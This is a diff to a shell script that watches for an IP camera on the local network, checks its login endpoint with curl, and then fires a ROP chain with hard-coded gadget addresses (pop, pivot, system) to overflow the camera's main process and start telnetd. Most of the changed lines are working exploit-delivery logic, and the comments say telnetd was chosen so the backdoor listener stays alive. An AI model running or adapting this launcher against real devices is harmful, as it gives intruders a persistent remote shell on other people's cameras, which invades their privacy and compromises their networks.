@@ -83,11 +83,27 @@ while :; do
       continue
     fi
     phase RUNNING
-    # The 192.168.4/22 link route returns EHOSTUNREACH for LAN hosts on this subnet (the LAN is
-    # en1, the route resolves to en0), so `login()` dies before any payload ships. A static host
-    # route via the gateway fixes it; an existing one makes `route add` print "File exists", which
-    # is not an error. The route is per-boot, so it is re-asserted, never assumed.
+    # en1 route fix (per-boot, re-asserted)
     $ROUTE_CMD -host "$ip" "$GW" >/dev/null 2>&1 || true
+    # DS-READINESS GATE (OMP review / C460 lesson): fire only when the camera's login
+    # succeeds — a pingable-but-sleeping camera has no main process to overflow.
+    DS_READY=0
+    for _try in 1 2 3; do
+      _login_out=$(curl -s --connect-timeout 3 -m 5 \
+        -d '{"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}}' \
+        "http://${ip}/" 2>/dev/null | head -1)
+      if echo "$_login_out" | grep -q 'stok'; then
+        DS_READY=1; break
+      fi
+      sleep 2
+    done
+    if [ "$DS_READY" != "1" ]; then
+      log "DS not ready at $ip (camera asleep) — skipping fire, will retry next presence"
+      phase WAITING
+      sleep "$POLL"
+      continue
+    fi
+    log "DS ready at $ip — firing ROP (pop 0x24462 pivot 0x28514e system 0x15928, telnetd)"
     # C660 chain is non-PIE ROP from the offline BCL1 decode — fixed .text addresses,
     # no stack sweep. telnetd (not nc -e) so the listener survives past one connection.
     log "present at $ip — ROP fire (pop 0x24462 pivot 0x28514e system 0x15928, telnetd)"
